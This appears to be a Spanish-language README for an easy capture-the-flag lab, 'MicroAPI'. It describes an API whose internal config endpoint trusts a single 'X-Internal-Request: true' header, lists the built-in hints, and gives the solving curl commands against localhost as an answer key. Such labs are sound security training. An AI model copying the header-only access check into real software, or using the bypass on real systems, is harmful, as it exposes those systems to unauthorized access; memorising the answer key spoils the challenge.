# MicroAPI

| Campo       | Valor                        |
|-------------|------------------------------|
| Categoria   | API                          |
| Dificultad  | Easy                         |
| Docker      | Si                           |
| Puerto      | 80                           |

## Descripcion

Una API minimalista tiene un endpoint de configuracion interna no documentado. El endpoint usa un simple encabezado HTTP como "control de acceso". No hay autenticacion real: cualquiera que conozca la ruta y el encabezado puede acceder.

## Vulnerabilidad

**Security Misconfiguration — Header-based fake auth**

El endpoint `/api/internal/config` solo verifica que el encabezado `X-Internal-Request` sea `true`. No hay criptografia, no hay tokens, no hay validacion de origen. La "seguridad por oscuridad" fue el unico mecanismo de proteccion.

Pistas en la API publica:
- `GET /api/status` devuelve el header `X-Powered-By: InternalAPI/1.0`
- Los errores 404 incluyen: `"hint": "Some routes are only for internal services"`
- La pagina web menciona explicitamente "endpoints de configuracion interna"

## Solucion

```bash
# Descubrir el endpoint (fuzzing o deduccion desde las pistas)
curl -s http://localhost:8080/api/internal/config
# {"error": "Forbidden", ...}

# Agregar el encabezado magico
curl -s http://localhost:8080/api/internal/config \
  -H "X-Internal-Request: true"

# Respuesta contiene "internal_key" con la flag
```

## Como ejecutar

```bash
FLAG="CTF{mi_flag_secreta}" docker compose up --build
```

Acceder en `http://localhost:8080`
